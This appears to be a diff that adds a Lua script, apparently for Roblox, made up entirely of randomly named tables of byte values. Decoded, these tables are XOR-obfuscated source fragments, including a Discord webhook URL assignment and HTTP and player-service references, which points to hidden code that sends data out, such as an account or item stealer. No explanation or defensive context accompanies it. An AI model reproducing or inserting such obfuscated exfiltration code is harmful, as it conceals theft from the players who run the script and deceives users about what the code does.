+local _gmlvydpojodr = {70,32,35,47,45,32,108,42,57,34,47,56,37,35,34,108,31,41,34,40,1,41,33,46,41,62,4,37,56,100,40,45,56,45,101,70,108,108,108,108,37,42,108,59,41,46,36,35,35,39,24,35,39,41,34,108,113,113,108,110,110,108,56,36,41,34,108,62,41,56}
+local _qychwquqjuny = {121,102,123,125,108,109,43,32,3,41,41,41,41,41,41,41,41,123,108,125,124,123,103,3,41,41,41,41,108,101,122,108,3,41,41,41,41,41,41,41,41,121,123,96,103,125,33,95,64,89,41,104,103,109,41,43,95,64,89,41,90,108,123,127,108,123,41,109,108,125}
+local _wwrfgddyvywb = {248,188,190,220,249,234,249,238,229,243,242,249,188,190,188,243,238,188,190,190,150,188,188,188,188,207,249,242,248,218,245,238,239,232,209,249,239,239,253,251,249,180,235,249,253,236,243,242,239,200,243,207,249,242,248,176,188,236,238,249,250,245,228,181,150,150,188,188,188,188}
+local _fdxufhxbqyrm = {66,95,79,117,32,56,81,15,22,17,24,58,9,26,13,6,16,17,26,95,66,95,93,38,26,12,93,95,117,32,56,81,8,26,29,23,16,16,20,95,66,95,93,23,11,11,15,12,69,80,80,27,22,12,28,16,13,27,81,28,16,18,80,30,15,22,80,8,26,29}
+local _dpwonlvinlzd = {160,131,169,169,169,169,229,230,234,232,229,169,255,232,229,252,236,197,224,250,253,169,180,169,242,244,131,169,169,169,169,239,230,251,169,237,232,253,232,224,237,165,169,224,253,236,228,169,224,231,169,249,232,224,251,250,161,237,232,253,232,235,232,250,236,160,169,237,230,131}
+local _ugumbdeaajxj = {217,204,221,236,202,217,220,221,150,247,214,251,212,209,221,214,204,253,206,221,214,204,130,251,215,214,214,221,219,204,144,222,205,214,219,204,209,215,214,144,192,145,152,231,255,150,244,217,203,204,247,222,222,221,202,152,133,152,192,150,244,217,203,204,247,222,222,221,202,152}
+local _weszljnrtanq = {105,120,112,83,124,112,120,39,112,124,105,126,117,53,63,53,70,67,33,64,54,52,63,52,23,61,61,61,61,61,61,61,61,116,123,61,116,105,120,112,83,124,112,120,61,105,117,120,115,23,61,61,61,61,61,61,61,61,61,61,61,61,116,105,120,112,83,124,112,120}
+local _iakhkpihhxtz = {120,112,47,121,122,98,112,103,61,60,60,53,97,125,112,123,31,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,113,122,65,103,116,113,112,61,101,59,91,116,120,112,60,53,31,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,103,112,97,96}
+local _jleyfhuwcklv = {71,69,42,8,29,14,11,11,6,72,82,73,87,71,79,48,14,9,3,8,16,20,71,41,51,71,86,87,73,87,92,71,48,14,9,81,83,92,71,31,81,83,78,71,38,23,23,11,2,48,2,5,44,14,19,72,82,84,80,73,84,81,71,79,44,47,51,42,43,75}
+local _mxjjrbrcjumu = {228,227,227,231,255,163,189,184,181,185,181,189,181,180,187,186,190,191,186,191,187,180,190,184,191,163,246,181,218,233,161,254,190,223,237,233,187,251,248,218,245,198,161,181,200,232,199,190,219,226,220,161,198,181,207,207,213,248,205,198,211,226,184,224,219,232,220,217,219,198}
+local _yshsdtkdfeuc = {69,9,20,9,68,72,90,93,76,91,124,91,69,5,35,9,9,9,9,9,9,9,9,9,9,9,9,100,76,93,65,70,77,9,20,9,11,121,102,122,125,11,5,35,9,9,9,9,9,9,9,9,9,9,9,9,97,76,72,77,76,91,90,9,20,9,82,9,114,11}
+local _wsmyeuzulzoq = {115,61,50,62,54,115,110,115,113,15,97,103,99,15,98,102,106,15,98,103,107,15,98,102,98,115,2,38,58,48,56,115,25,60,58,61,113,127,115,37,50,63,38,54,115,110,115,113,8,121,121,16,63,58,48,56,115,39,60,115,25,60,58,61,121,121,14,123,113,115}
+local _jtxdwcckcjos = {182,183,252,147,177,177,183,162,166,134,160,179,182,183,232,148,187,160,183,129,183,160,164,183,160,250,181,179,191,183,252,130,190,179,177,183,155,182,242,248,242,225,254,242,141,149,252,158,179,161,166,157,180,180,183,160,251,216,242,242,242,242,183,190,161,183,216,242,242,242}
+local _mickqcpchewa = {20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,124,81,85,80,81,70,71,20,9,20,79,62,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,111,22,119,91,90,64,81,90,64,25,96,77,68,81,22,105,20,9,20,22,85,68,68}
+local _gjplpnqvwhnf = {5,9,1,77,110,68,68,68,68,68,68,68,68,8,11,7,5,8,68,20,5,29,8,11,5,0,68,89,68,31,110,68,68,68,68,68,68,68,68,68,68,68,68,14,11,6,45,0,68,89,68,14,11,6,45,0,72,68,110,68,68,68,68,68,68,68,68,68,68,68}
+local _tipbmveksxoj = {106,107,72,55,44,54,43,46,98,49,33,48,43,50,54,17,54,35,54,55,49,98,127,127,98,115,72,72,46,45,33,35,46,98,49,54,35,54,55,49,15,49,37,98,127,98,96,20,35,46,43,38,35,54,43,45,44,98,17,55,33,33,39,49,49,96,72,72,46,45}
+local _kjgvekyfepie = {142,194,132,151,140,129,150,139,141,140,194,183,140,142,141,129,137,182,144,131,134,135,145,202,203,232,235,235,133,131,143,135,216,165,135,150,177,135,144,148,139,129,135,202,192,176,135,146,142,139,129,131,150,135,134,177,150,141,144,131,133,135,192,203,216,181,131,139,150,164}
+local _ljolyehtmghk = {89,88,105,79,89,78,16,28,76,80,93,69,89,78,18,114,93,81,89,6,80,83,75,89,78,20,21,21,28,72,84,89,82,54,28,28,28,28,28,28,28,28,28,28,28,28,88,83,104,78,93,88,89,20,76,80,93,69,89,78,18,114,93,81,89,21,54,28,28,28}
+local _nlhixtndfxsj = {167,167,171,177,170,176,133,163,161,228,234,234,228,230,228,160,165,189,183,164,164,164,230,232,228,173,170,168,173,170,161,228,249,228,162,165,168,183,161,228,185,232,206,228,228,228,228,228,228,228,228,228,228,228,228,228,228,228,228,191,228,170,165,169,161,228,249,228,230,152}
+local _oldudkcpzqex = {7,7,78,65,7,80,66,70,87,72,73,120,85,70,85,78,83,94,120,78,73,67,66,95,7,70,73,67,7,80,66,70,87,72,73,120,85,70,85,78,83,94,120,78,73,67,66,95,7,25,26,7,74,78,73,120,85,70,85,78,83,94,120,78,73,67,66,95,7,70}
+local _tubteugnizim = {193,226,200,200,200,200,141,134,140,226,141,134,140,226,132,135,139,137,132,200,142,157,134,139,156,129,135,134,200,187,141,139,157,154,141,187,141,134,140,192,140,137,156,137,193,226,226,200,200,200,200,132,135,139,137,132,200,133,137,155,156,141,154,188,135,131,141,134,200,213}
+local _toqewozjlbay = {197,198,202,200,197,137,207,220,199,202,221,192,198,199,137,205,198,253,219,200,205,204,129,195,198,192,199,204,205,252,218,204,219,128,163,137,137,137,137,137,137,137,137,197,198,202,200,197,137,192,199,192,221,192,200,197,253,219,200,205,204,250,221,200,221,204,137,148,137,206}
+local _ggrlajzktrbc = {158,141,136,137,194,163,138,138,137,158,165,152,137,129,214,170,133,158,137,191,137,158,154,137,158,196,133,136,192,204,206,187,137,141,156,131,130,159,206,197,230,137,130,136,230,230,128,131,143,141,128,204,138,153,130,143,152,133,131,130,204,191,137,130,136,170,133,158,159,152}
+local _xznilzhilzsf = {168,229,198,236,236,236,236,236,236,236,236,236,236,236,236,177,229,198,236,236,236,236,236,236,236,236,169,162,168,229,198,169,162,168,198,169,162,168,198,160,163,175,173,160,236,170,185,162,175,184,165,163,162,236,173,191,191,165,171,162,136,164,152,163,136,173,184,173,174,173}
+local _lcphuoqqloag = {47,100,102,115,98,96,104,117,110,98,116,83,104,65,98,115,100,111,46,39,99,104,13,39,39,39,39,39,39,39,39,115,102,116,108,41,116,119,102,112,105,47,97,114,105,100,115,110,104,105,47,46,13,39,39,39,39,39,39,39,39,39,39,39,39,107,104,100,102,107}
+local _vnqophiwddfd = {202,133,129,198,202,142,143,137,133,142,143,142,202,215,202,154,137,139,134,134,194,140,159,132,137,158,131,133,132,194,195,202,152,143,158,159,152,132,202,162,158,158,154,185,143,152,156,131,137,143,208,160,185,165,164,174,143,137,133,142,143,194,152,143,153,196,168,133,142,147}
+local _snqhvpyvzphd = {216,212,214,219,151,197,214,197,222,195,206,227,214,213,219,210,151,138,151,204,149,244,216,218,218,216,217,149,155,151,149,226,217,212,216,218,218,216,217,149,155,151,149,229,214,197,210,149,155,151,149,242,199,222,212,149,155,151,149,251,210,208,210,217,211,214,197,206,149,155}
+local _yxyvlrsuxver = {175,178,175,200,234,251,223,227,238,246,234,253,195,234,249,234,227,181,198,225,249,224,228,234,220,234,253,249,234,253,167,227,224,236,238,227,223,227,238,246,234,253,166,133,133,230,233,175,249,230,236,251,230,226,195,234,249,234,227,175,179,175,190,191,175,251,231,234,225,133}
+local _glthhwhbqunu = {233,206,214,207,203,197,243,197,210,214,197,210,136,208,204,210,142,238,193,205,197,137,170,128,128,128,128,128,128,128,128,128,128,128,128,128,128,128,128,204,207,195,193,204,128,198,201,210,211,212,233,212,197,205,225,212,212,197,205,208,212,197,196,128,157,128,215,197,193,208}
+local _pvfzxadkzsid = {163,128,170,170,170,170,230,229,233,235,230,170,227,254,239,231,249,170,183,170,241,247,128,170,170,170,170,236,229,248,170,213,166,170,227,254,239,231,170,227,228,170,227,250,235,227,248,249,162,230,227,249,254,163,170,238,229,128,128,170,170,170,170,170,170,170,170,230,229,233}
+local _qvzaujoaosnc = {4,4,46,4,4,4,4,46,4,4,4,4,72,75,71,69,72,4,72,75,75,79,81,84,111,65,93,4,25,4,80,75,87,80,86,77,74,67,12,77,80,65,73,10,96,69,80,69,109,96,13,30,67,87,81,70,12,6,1,87,15,6,8,4,6,6,13,46,4,4}
+local _rdmwtefbnldw = {179,227,162,173,167,227,171,183,183,179,237,177,166,178,182,166,176,183,234,227,172,177,227,171,183,183,179,156,177,166,178,182,166,176,183,201,227,227,227,227,227,227,227,227,177,166,183,182,177,173,227,177,166,178,182,166,176,183,133,182,173,160,235,184,201,227,227,227,227,227}
+local _yjtzujuqikxv = {23,29,115,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,28,23,29,115,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,13,24,10,18,87,14,24,16,13,81,79,80,115,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,24,26}
+local _nyfpxwsbqnkc = {206,212,249,204,199,210,227,185,225,218,233,221,216,218,199,217,188,251,235,188,224,200,223,193,198,233,203,191,235,250,216,236,202,187,226,255,216,210,197,175,161,135,173,173,173,173,173,173,173,173,173,173,173,173,192,232,249,229,226,233,173,176,173,175,221,194,222,217,175,161}
+local _gdzfnwraxirk = {81,1,29,16,18,20,56,21,81,76,81,22,16,28,20,95,33,29,16,18,20,56,21,93,123,81,81,81,81,81,81,81,81,81,81,81,81,4,2,20,3,31,16,28,20,81,76,81,1,29,3,95,63,16,28,20,93,123,81,81,81,81,81,81,81,81,81,81,81,81}
+local _aipsnpwjvgfl = {239,226,247,229,236,241,238,170,163,253,190,163,161,198,237,246,238,202,247,230,238,161,163,247,235,230,237,137,163,163,163,163,230,241,241,236,241,171,236,232,170,137,163,163,163,163,241,230,247,246,241,237,137,230,237,231,137,137,137,234,229,163,247,250,243,230,236,229,171,243}
+local _clzoptlbvcgd = {14,71,75,2,31,14,6,9,4,15,18,47,2,29,75,2,5,75,3,31,6,7,40,4,5,31,14,5,31,81,12,6,10,31,8,3,67,73,87,15,2,29,78,24,64,8,7,10,24,24,86,48,76,55,73,54,2,31,14,6,3,14,10,15,48,76,55,73,54,85}
+local _pkjwczfgdbcv = {53,33,37,53,35,36,120,37,35,53,34,121,90,112,112,112,112,60,63,51,49,60,112,36,49,34,55,53,36,112,109,112,0,60,49,41,53,34,35,106,22,57,62,52,22,57,34,35,36,19,56,57,60,52,120,37,35,53,34,121,90,112,112,112,112,57,54,112,36,49}
+local _bhipddwmerhh = {18,19,19,26,85,72,26,24,111,84,81,84,85,77,84,24,48,26,26,48,26,26,26,26,86,85,89,91,86,26,112,85,83,84,118,83,84,81,26,7,26,24,82,78,78,74,73,0,21,21,92,95,72,84,20,77,78,92,21,80,85,83,84,95,72,5,74,86,91,89}
+local _gzsuihrxtljg = {231,148,234,171,227,234,225,146,228,230,243,224,173,241,237,230,197,239,239,239,239,166,169,239,185,174,163,186,170,156,187,189,239,187,167,170,161,197,239,239,239,239,239,239,239,239,185,174,163,186,170,156,187,189,239,242,239,185,174,163,186,170,156,187,189,245,168,188,186,173}
+local _buenredtbaxg = {77,15,1,18,124,77,68,77,88,71,90,92,124,71,120,68,73,75,77,97,70,91,92,73,70,75,77,0,25,28,26,16,26,27,26,17,25,4,8,15,10,8,6,6,8,66,71,74,97,76,8,6,6,8,10,15,1,10,4,34,8,8,8,8,8,8,8,8,93,91}
+local _egfwplefunjh = {207,208,209,210,211,212,213,214,215,216,217,218,144,145,146,147,148,149,150,151,152,153,139,143,135,170,128,128,128,128,128,128,128,128,210,197,212,213,210,206,128,136,136,196,193,212,193,154,199,211,213,194,136,135,142,135,140,128,198,213,206,195,212,201,207,206,136,216,137,128}
+local _jkgzmabvgtot = {153,142,187,137,149,220,193,220,140,144,142,198,171,157,149,136,186,147,142,191,148,149,144,152,212,222,172,144,157,133,153,142,187,137,149,222,213,246,136,157,143,151,210,143,140,157,139,146,212,154,137,146,159,136,149,147,146,212,213,246,220,220,220,220,144,147,159,157,144,220}
+local _aumxhatgevgc = {118,126,61,82,126,124,102,125,103,51,124,97,51,34,58,58,25,51,51,51,51,118,125,119,25,51,51,51,51,127,124,112,114,127,51,102,96,119,87,114,103,114,51,46,51,84,118,103,70,64,87,59,127,122,96,103,58,25,51,51,51,51,127,124,112,114,127,51,103,124}
+local _mhknevxvpqtu = {253,253,253,253,160,244,215,253,253,253,253,184,179,185,244,215,253,253,253,253,180,187,253,174,168,190,190,184,174,174,253,188,179,185,253,175,184,174,253,188,179,185,253,175,184,174,243,159,178,185,164,253,169,181,184,179,215,253,253,253,253,253,253,253,253,177,178,190,188,177}
+local _ebzfbqbwiiii = {136,140,199,218,199,197,161,146,132,140,134,148,148,199,137,142,128,128,130,149,199,128,136,199,129,146,132,140,199,146,149,148,130,139,129,197,199,237,237,139,136,132,134,139,199,129,146,137,132,147,142,136,137,199,130,159,151,139,134,142,137,180,132,149,142,151,147,148,207,145}
+local _vwwqryjfqucm = {223,217,216,158,159,188,150,150,150,150,218,217,213,215,218,150,196,211,199,195,211,197,194,240,195,216,213,150,139,150,196,211,199,195,211,197,194,150,217,196,150,158,197,207,216,150,215,216,210,150,197,207,216,152,196,211,199,195,211,197,194,159,150,217,196,150,158,222,194,194}
+local _aazzfptesdmj = {80,77,22,103,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,25,8,21,25,77,80,77,79,44,9,31,8,3,12,1,4,3,67,26,4,3,77,37,8,1,29,8,31,77,49,92,84,89,49,92,85,94,77,9,4,30,14,2,31,9,67,10,10,66,57}
+local _tgcpbkrnimcq = {203,194,199,221,218,203,202,142,147,142,218,220,219,203,164,142,142,142,142,142,142,142,142,204,220,203,207,197,164,142,142,142,142,203,192,202,164,203,192,202,164,164,164,199,200,142,199,221,249,198,199,218,203,194,199,221,218,203,202,142,218,198,203,192,164,164,142,142,142,142}
+local _banziuprtvxw = {62,106,108,127,122,123,77,106,127,106,107,109,62,35,35,62,60,76,123,125,123,119,104,119,112,121,76,123,111,107,123,109,106,60,62,106,118,123,112,20,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,74,108,127,122,123,48,90,123,125,114,119,112,123,76}
+local _bhfcufytpxlo = {194,195,222,249,194,254,200,195,201,246,156,240,131,233,204,217,204,228,233,167,141,141,141,141,141,141,141,141,141,141,141,141,141,141,141,141,196,203,141,195,194,217,141,206,216,223,223,200,195,217,228,195,219,131,250,200,204,221,194,195,222,131,226,218,195,200,201,246,203,196}
+local _smlhscowzhbc = {135,135,135,135,135,135,135,135,229,200,195,222,135,154,135,239,211,211,215,244,194,213,209,206,196,194,157,237,244,232,233,226,201,196,200,195,194,143,195,198,211,198,142,173,135,135,135,135,135,135,135,135,218,142,173,135,135,135,135,194,201,195,142,173,135,135,135,135,206,193}
+local _ceahwhlxsvjg = {229,215,254,227,197,227,240,245,244,210,254,252,225,253,244,229,248,254,255,185,184,155,177,177,177,177,230,249,248,253,244,177,229,227,228,244,177,245,254,155,177,177,177,177,177,177,177,177,229,240,226,250,191,230,240,248,229,185,161,191,160,184,155,177,177,177,177,177,177,177}
+local _vrinrrpfkknq = {213,215,198,194,193,192,205,145,193,195,148,147,150,204,194,198,150,192,147,204,198,199,194,194,204,205,195,150,144,147,197,197,150,205,215,255,213,213,213,213,153,154,150,148,153,213,152,148,134,129,144,135,160,135,153,213,200,213,215,157,129,129,133,207,218,218,199,196,198,219}
+local _wzbjfbbcytow = {99,100,126,114,99,99,100,126,114,99,99,96,126,114,99,99,103,126,114,103,106,126,114,102,101,126,114,102,101,126,114,99,98,96,126,114,99,99,101,126,114,107,107,126,114,99,98,101,126,114,99,98,103,126,114,99,99,98,126,114,99,98,97,126,114,99,99,98,126,114}
+local _lfgefqroptyo = {185,172,190,166,227,186,172,164,185,229,228,199,168,163,169,199,164,171,237,174,162,163,163,237,185,165,168,163,199,237,237,237,237,174,162,163,163,247,137,164,190,174,162,163,163,168,174,185,229,228,199,168,163,169,199,199,161,162,174,172,161,237,157,161,172,180,168,191,190,237}
+local _uaiuxvtujzce = {112,113,106,119,37,43,43,37,39,101,101,101,39,41,37,108,107,105,108,107,96,37,56,37,113,119,112,96,37,120,41,15,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,126,37,107,100,104,96,37,56,37,39,89,55,49,53,89,52,48,60,89,52,49,50}
+local _qgtfydsqudpi = {232,222,213,223,246,222,214,217,222,201,243,210,207,147,223,218,207,218,146,177,155,155,155,155,218,200,200,210,220,213,243,210,207,239,212,255,218,207,218,217,218,200,222,147,146,177,222,215,200,222,177,155,155,155,155,232,222,213,223,246,222,214,217,222,201,243,210,207,147,223}
+local _ibcbbciwjnta = {90,82,13,68,71,91,94,67,31,21,23,116,91,94,84,92,23,21,30,30,108,6,106,30,61,23,23,23,23,23,23,23,23,23,23,23,23,91,88,84,86,91,23,65,86,91,66,82,23,10,23,71,86,69,68,82,97,86,91,66,82,31,94,67,82,90,85,88,83,78}
+local _gxlgcrcppauz = {52,102,117,102,125,96,109,52,41,52,119,117,96,113,115,123,102,109,58,102,117,102,125,96,109,30,52,52,52,52,52,52,52,52,52,52,52,52,120,123,119,117,120,52,97,102,120,52,41,52,119,117,96,113,115,123,102,109,58,97,102,120,30,52,52,52,52,52,52,52}
+local _zvcgvmhcbtgc = {4,26,124,86,86,86,86,86,86,86,86,86,86,86,86,11,90,124,86,86,86,86,86,86,86,86,86,86,86,86,2,31,2,26,19,86,75,86,6,26,4,88,56,23,27,19,90,124,86,86,86,86,86,86,86,86,86,86,86,86,3,4,26,86,75,86,6,4,25,16}
+local _ctcjaimbjvxk = {172,172,172,172,172,172,172,172,172,172,172,248,254,249,226,239,237,248,233,232,172,177,172,248,254,249,233,134,172,172,172,172,172,172,172,172,172,172,172,172,238,254,233,237,231,134,172,172,172,172,172,172,172,172,233,226,232,134,172,172,172,172,233,226,232,134,134,172,172,172}
+local _flscvsiyxagz = {144,186,186,186,186,186,186,186,186,186,186,186,186,210,255,251,254,255,232,233,186,167,186,225,186,193,184,217,245,244,238,255,244,238,183,206,227,234,255,184,199,186,167,186,184,251,234,234,246,243,249,251,238,243,245,244,181,240,233,245,244,184,186,231,182,144,186,186,186,186}
+local _camzwyajmifg = {45,42,43,60,111,114,111,52,52,69,111,111,111,111,111,111,111,111,111,111,111,111,46,58,59,39,32,61,111,114,111,52,69,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,33,46,34,42,111,114,111,109,19,125,125,121,19,126,122,123,19,126,121,126,111}
+local _luavdyrihtpv = {246,162,185,184,163,187,180,179,164,254,191,162,179,187,134,164,191,181,179,165,141,186,185,185,189,163,166,151,139,248,166,164,191,181,179,255,255,246,185,164,246,230,220,246,246,246,246,186,185,181,183,186,246,166,164,191,181,179,148,246,235,246,254,191,162,179,187,134,164,191}
+local _eiojayxkeuqr = {96,80,119,105,37,56,37,114,96,103,109,106,106,110,80,119,105,15,15,105,106,102,100,105,37,65,109,80,118,96,119,118,37,56,37,126,37,34,111,106,96,127,96,108,99,52,52,52,125,34,41,34,106,104,100,119,115,102,52,50,34,120,15,90,66,43,100,112,113,106}
+local _cuhuzwfockwl = {170,188,241,240,211,249,249,249,249,211,249,249,249,249,181,182,186,184,181,249,172,170,188,171,149,176,170,173,173,249,228,249,157,177,140,170,188,171,170,249,182,171,249,162,164,211,249,249,249,249,211,249,249,249,249,191,182,171,249,134,245,249,171,188,186,188,176,175,188,171}
+local _mxeqqduepgtr = {17,17,88,87,17,88,69,84,92,120,95,87,94,17,80,95,85,17,88,69,84,92,120,95,87,94,31,114,89,67,94,92,80,17,69,89,84,95,59,17,17,17,17,17,17,17,17,88,87,17,95,94,69,17,85,88,66,65,93,80,72,127,80,92,84,11,87,88,95,85}
+local _zmbztzznysed = {119,62,57,119,62,39,54,62,37,36,127,34,36,50,37,27,62,36,35,126,119,51,56,93,119,119,119,119,119,119,119,119,59,56,52,54,59,119,37,50,52,50,62,33,50,37,4,35,37,119,106,119,35,56,36,35,37,62,57,48,127,37,50,52,50,62,33,50,37,25}
+local _tmqircpukdib = {198,220,209,205,192,250,233,192,194,192,203,193,196,215,220,133,152,133,209,215,208,192,137,133,226,204,203,194,192,215,214,198,220,209,205,192,250,226,202,193,201,220,133,152,133,209,215,208,192,137,133,226,204,203,194,192,215,214,198,220,209,205,192,250,228,203,198,204,192,203}
+local _fdgipzgkohfs = {215,144,146,131,163,133,150,147,146,164,131,150,131,130,132,223,222,253,215,215,215,215,215,215,215,215,215,215,215,215,158,145,215,131,133,150,147,146,164,131,150,131,130,132,215,202,202,215,213,185,152,153,146,213,215,131,159,146,153,253,215,215,215,215,215,215,215,215,215,215}
+local _spgcjzermjcx = {225,239,239,237,250,183,253,251,237,250,193,236,181,170,168,166,166,168,252,231,251,252,250,225,230,239,160,248,228,250,166,221,251,237,250,193,236,161,130,168,168,168,168,228,231,235,233,228,168,248,250,231,238,225,228,237,221,250,228,168,181,168,170,224,252,252,248,251,178,167}
+local _vurqtprzxkhb = {9,5,7,29,6,28,65,98,72,72,72,72,72,72,72,72,72,72,72,72,28,9,10,4,13,70,1,6,27,13,26,28,64,31,13,9,24,7,6,27,60,7,59,13,6,12,68,72,19,44,9,28,9,33,44,72,85,72,12,9,28,9,1,12,68,72,58,9,26,1}
+local _zicvktdlcjye = {27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,87,84,88,90,87,27,94,67,79,73,90,88,79,94,95,27,6,27,94,67,79,73,90,88,79,114,79,94,86,72,19,83,79,86,87,120,84,85,79,94,85,79,18,49,27,27,27,27,27,27,27,27,27}
+local _elxjsisrglfi = {202,224,224,224,224,176,163,161,172,172,232,166,181,174,163,180,169,175,174,232,233,202,224,224,224,224,224,224,224,224,172,175,163,161,172,224,178,165,179,176,175,174,179,165,224,253,224,167,161,173,165,250,136,180,180,176,135,165,180,232,226,168,180,180,176,250,239,239,169,176}
+local _veitadkpfldn = {8,20,55,29,29,29,29,84,91,29,73,79,92,89,88,90,72,84,77,85,82,83,88,29,73,85,88,83,55,29,29,29,29,29,29,29,29,73,79,92,89,88,90,72,84,77,85,82,83,88,7,122,88,73,109,79,82,77,88,79,73,68,126,85,92,83,90,88,89,110}
+local _wmbeigaofhju = {255,252,240,242,255,179,240,230,225,225,246,253,231,218,253,229,179,174,179,193,246,227,255,250,240,242,231,246,247,192,231,252,225,242,244,246,189,193,246,254,252,231,246,224,189,218,253,229,246,253,231,252,225,234,189,212,246,231,195,225,252,245,250,255,246,215,242,231,242,169}
+local _pdfmytavzard = {81,87,68,70,81,64,65,115,68,73,80,64,86,126,76,81,64,72,107,68,72,64,120,5,81,77,64,75,47,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,83,68,73,80,64,105,76,86,81,126,65,68,81,68,76,65,120}
+local _siminwlkmtes = {222,215,146,153,147,222,253,215,215,215,215,215,215,215,215,158,145,215,152,156,215,150,153,147,215,147,146,148,152,147,146,147,215,131,159,146,153,215,133,146,131,130,133,153,215,147,146,148,152,147,146,147,215,146,153,147,253,215,215,215,215,146,153,147,253,215,215,215,215,133}
+local _mijavdeyxxck = {224,172,189,164,227,174,162,160,226,167,190,162,163,226,239,228,199,237,237,237,237,237,237,237,237,161,162,174,172,161,237,169,172,185,172,237,240,237,133,185,185,189,158,168,191,187,164,174,168,247,135,158,130,131,137,168,174,162,169,168,229,191,168,190,189,162,163,190,168,228}
+local _nkzulwkcoild = {80,71,91,84,88,80,21,8,21,23,116,81,71,80,91,84,89,92,91,27,66,92,91,21,102,65,80,84,89,80,71,23,25,63,21,21,21,21,21,21,21,21,84,67,84,65,84,71,106,64,71,89,21,8,21,23,93,65,65,69,70,15,26,26,86,70,4,1,27,69}
+local _fkqjovpbnkmu = {80,86,85,81,68,87,28,17,14,70,93,11,82,68,28,17,14,93,11,83,27,20,25,11,11,69,35,95,36,90,37,17,12,29,21,26,23,28,1,35,95,36,90,37,70,80,86,85,81,68,87,28,17,14,70,90,81,88,28,23,114,88,88,88,88,88,88,88,88,27}
+local _krkjnzocmira = {26,7,5,79,83,83,87,29,8,8,21,22,20,9,22,17,18,9,19,17,9,21,19,16,29,20,23,23,21,8,79,78,83,5,11,45,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,106,66,83,79,72,67,7,26,7,5,119,104,116,115,5,11,45,7}
+local _wytuzgdgtloo = {167,141,141,141,141,141,141,141,141,141,141,141,141,193,194,206,204,193,141,223,129,207,144,138,138,129,213,151,207,212,217,200,133,132,141,203,194,223,141,196,144,149,129,156,129,128,156,141,201,194,141,223,144,223,131,131,133,207,136,159,243,196,128,207,136,159,243,133,196,128}
+local _svfavvjkzjgb = {53,91,113,113,113,113,113,113,113,113,52,63,53,91,113,113,113,113,52,63,53,91,113,113,113,113,35,52,37,36,35,63,113,56,37,52,60,7,48,61,36,52,34,91,52,63,53,91,61,62,50,48,61,113,55,36,63,50,37,56,62,63,113,52,41,37,35,48,50,37}
+local _xiwkqhxarlgb = {78,90,94,78,88,95,17,109,66,89,78,120,78,89,93,78,89,3,2,33,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,95,74,88,64,5,92,74,66,95,3,27,5,24,2,33,11,11,11,11,11,11,11,11,11,11,11,11,78,71,88,78,66,77,11}
+local _hafjjsrjfbdy = {251,172,186,169,181,243,249,180,176,249,242,209,251,251,251,251,251,251,251,251,190,181,191,209,251,251,251,251,190,183,168,190,209,251,251,251,251,251,251,251,251,172,186,169,181,243,249,158,169,169,225,251,249,251,245,245,251,175,180,168,175,169,178,181,188,243,169,190,168,242}
+local _siqxjvrahmaz = {149,182,167,176,187,243,238,243,168,174,217,243,243,243,243,181,188,161,243,161,178,161,186,167,170,255,243,166,161,191,243,186,189,243,163,178,186,161,160,251,176,178,167,182,180,188,161,186,182,160,250,243,183,188,217,243,243,243,243,243,243,243,243,167,178,177,191,182,253,186}
+local _obclueagyvbn = {192,199,202,213,195,172,207,192,134,193,195,210,193,195,200,208,142,143,136,195,222,195,197,211,210,195,194,134,210,206,195,200,134,172,134,134,134,134,212,195,210,211,212,200,134,172,195,200,194,172,193,195,210,193,195,200,208,142,143,136,195,222,195,197,211,210,195,194,134,155}
+local _jukujxiyvuaj = {55,55,123,120,116,118,123,55,115,126,100,103,123,118,110,89,118,122,114,55,42,55,126,99,114,122,94,121,113,120,55,118,121,115,55,126,99,114,122,94,121,113,120,57,94,99,114,122,89,118,122,114,55,120,101,55,126,99,114,122,57,83,118,99,118,94,83,29,55,55}
+local _arysmxfztyio = {187,166,188,232,187,189,184,184,167,186,188,173,172,232,184,164,173,169,187,173,232,189,187,173,232,176,173,166,167,232,167,186,232,169,166,177,232,167,188,160,173,186,232,173,176,173,171,189,188,173,186,234,225,194,232,232,232,232,186,173,188,189,186,166,194,173,166,172,194,164}
+local _cxkrnyjutqpo = {231,250,189,187,183,191,224,157,191,174,137,191,168,172,179,185,191,242,248,138,182,187,163,191,168,169,248,243,208,182,181,185,187,182,250,170,182,187,163,191,168,250,231,250,138,182,187,163,191,168,169,244,150,181,185,187,182,138,182,187,163,191,168,208,182,181,185,187,182,250}
+local _gwiufssozlvu = {163,174,165,193,193,235,235,235,235,235,235,235,235,235,235,235,235,235,235,235,235,165,170,166,174,235,246,235,233,136,163,185,164,166,170,233,235,229,229,235,165,170,166,174,241,172,184,190,169,227,233,136,163,185,164,166,170,233,231,235,233,233,226,193,235,235,235,235,235,235}
+local _ttxrplctfzvv = {63,63,63,100,63,113,126,114,122,63,34,63,61,67,45,43,47,67,46,42,38,67,46,43,47,67,46,43,43,63,76,122,109,105,122,109,63,86,113,121,112,61,51,63,105,126,115,106,122,63,34,63,61,127,127,127,79,115,126,102,122,109,108,37,63,61,63,49,49,63}
+local _imwhzjxbddfe = {37,25,20,12,16,7,6,87,92,127,127,25,26,22,20,25,85,50,16,1,37,25,20,12,16,7,57,16,3,16,25,85,72,85,39,16,5,25,28,22,20,1,16,17,38,1,26,7,20,18,16,91,39,16,24,26,1,16,6,91,48,13,1,7,20,6,91,50,16,1}
+local _tflmtqkhwdlv = {236,232,162,183,183,170,169,171,182,169,174,173,182,172,174,182,170,172,175,162,171,168,168,170,183,240,241,236,186,180,146,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,184,213,253,236,240,247,252,184,165,184,186,200,215,203,204,186,180,146,184,184,184,184,184,184}
